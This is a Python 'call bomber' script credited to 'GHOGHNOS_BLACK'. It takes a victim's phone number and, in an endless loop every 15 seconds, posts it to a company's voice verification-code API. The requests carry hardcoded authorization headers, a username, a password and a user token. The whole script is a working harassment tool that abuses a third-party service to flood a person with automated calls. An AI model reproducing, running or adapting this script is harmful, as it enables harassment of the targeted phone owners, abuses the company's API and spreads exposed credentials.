
import requests
import time
import datetime
import os
import sys
os.system("pip install time")
os.system("pip install socket")
os.system("pip install _thread")
import socket
import _thread
print(f'\033[32m')
print(f'BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOMBER MAN')
print(f'\033[31m')
from time import sleep
x = ("""

|⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                      
|⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                      
|⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                      
|⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        
|⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                       
|⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
|⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⠀                       CREATOR : GHOGHNOS_BLACK
|⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀⠀              FUCK YOU NAMBER
|⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀              SKRIPT BOMBER
|⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀                
|⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀⠀⠀
|⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀⠀⠀
|⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀
|⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⡀⠀⠀
|⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⣿⣦⡀
|⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣷
|⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡿
|   . . ⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⣟⣋⣁⣀⣀⠀                   
|⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇ㅤ                  

		""")
for CoursNight in x :
	sleep(0.002)
	print(CoursNight,end='' ,flush=True)


x = '\033[31m'
print(x,'bomber call = ghod > GHOGHNOS BLACK << I LOVE YOU (SH) >>',x)




def send_verification_code(phone_number):
    url = "https://www.azki.co/api/vehicleorder/v2/app/auth/register-vocal-verify-code"

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==',
        'device': 'web',
        'deviceid': '6',
        'password': 'BimitoSecret',
        'origin': 'https://www.azki.com',
        'referer': 'https://www.azki.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
        'user-token': 'Gs0pn0o8sfSW1OYPjxAUKBPNjeT6FwYyrgE5OMnRP6eI4AzTAjIoPXV18YqIEZUN',
        'username': 'BimitoClient'
    }

    while True:
        data = {"phoneNumber": phone_number}
        response = requests.post(url=url, json=data, headers=headers)
        if response.status_code == 200:
            print(f'\033[35m')
            print("Request sent successfully.")
        else:
            print(f'\033[32m')
            print("Error in sending the request.")
        time.sleep(15)
print(f'\033[33m')
if __name__ == "__main__":
    print(' call BOMBED ')
    time.sleep(2)
    print(f'\033[32m')
    os.system("clear")
    number = input("Enter the phone number: ")
    current_time = datetime.datetime.now()
    print( current_time)
    send_verification_code(number)
    
